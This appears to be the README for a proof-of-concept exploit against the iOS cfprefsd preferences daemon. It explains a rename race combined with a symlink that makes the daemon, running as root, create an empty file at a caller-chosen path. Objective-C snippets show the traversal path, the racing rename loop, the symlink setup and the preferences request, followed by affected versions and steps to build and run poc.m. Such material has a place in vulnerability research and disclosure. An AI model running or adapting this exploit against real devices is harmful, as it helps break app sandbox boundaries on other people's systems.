# `cfprefsd` zero-file creation PoC

## Overview

This bug combines a container-path race with a final-symlink mismatch in
`cfprefsd`.

The daemon validates a canonical container path but later uses the caller's raw
path. A rename race changes which directory that path resolves to. A final
symlink then redirects the daemon's file creation.

This is a missing-file creation bug, not an existing-file zero-out bug. The
selected target must not exist before the request.

## Trigger

The raw path passes a system-group prefix check. Its canonical path points into
an app container:

```objc
NSString *rawContainer = [NSString stringWithFormat:
    @"/private/var/containers/Shared/SystemGroup/../../../mobile/"
     "Containers/Data/Application/%@/tmp/%@", appUUID, leaf];
```

The app races two names for the controlled container directory:

```objc
rename(hidden.fileSystemRepresentation, actual.fileSystemRepresentation);
usleep(35);
rename(actual.fileSystemRepresentation, hidden.fileSystemRepresentation);
```

The preference leaf in the controlled directory is a symlink to the selected
missing target. The app then sends an AnyUser preferences request:

```objc
symlink(target.fileSystemRepresentation,
        hiddenPreference.fileSystemRepresentation);

setValue(CFSTR("marker"), CFSTR("value"),
         (__bridge CFStringRef)domain,
         kCFPreferencesAnyUser, kCFPreferencesAnyHost,
         (__bridge CFStringRef)rawContainer);
synchronize((__bridge CFStringRef)domain,
            kCFPreferencesAnyUser, kCFPreferencesAnyHost,
            (__bridge CFStringRef)rawContainer);
```

## Paths accessed

The caller controls the raw traversal path and the final missing file path.
The demonstrated targets were an app-owned temporary directory and a path in a
second app container.

A successful race makes the system `cfprefsd` process create one selected
missing file:

```text
owner: root
mode: 0644
size: 0 bytes
```

The bug creates an empty file. It does not replace or truncate an existing
file. It also does not control the new file's contents.

## Versions

Works on iOS 27 beta 1 through beta 4 and iOS 26. It should also apply to
iOS 18, although some releases may need implementation adjustments.

## Use

1. Add [`poc.m`](poc.m) to an Objective-C iOS application target.
2. Build with the `iphoneos` SDK for `arm64e`.
3. Call `run_cfprefsd_zero_file_poc()` from a test action.
